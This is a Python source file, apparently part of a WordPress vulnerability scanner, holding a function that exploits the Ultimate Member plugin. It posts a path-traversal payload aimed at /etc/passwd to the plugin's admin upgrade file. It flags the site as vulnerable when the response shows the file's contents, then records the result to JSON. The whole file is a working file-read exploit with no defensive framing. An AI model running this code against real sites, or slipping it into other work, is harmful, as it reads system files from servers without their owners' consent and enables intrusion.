import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")




def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:

        headers = {
            # requests won't add a boundary if this header is set when you pass files=
            # 'Content-Type': 'multipart/form-data',
        }
        files = {
            'pack': (None, '../../../../../../../../../etc/passwd'),
        }

        response = req.post(
            '{}/wp-content/plugins/ultimate-member/includes/admin/core/class-admin-upgrade.php'.format(
                url),
            headers=headers,
            files=files,
        )
        if response.status_code == 200 and "root" in response.text:
            print(len(response.text), response.text)
            print(colors.yellow + "[+] ==> pack_exploit %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": response.url,
                "status": response.status_code,
                "exploit": "pack_exploit",
            })
            json_me(url, "pack_exploit", found)
        else:
            print(colors.red + "[-] pack_exploit ==> %s Not Vulnerable" % url)

    except Exception as e:
        pass



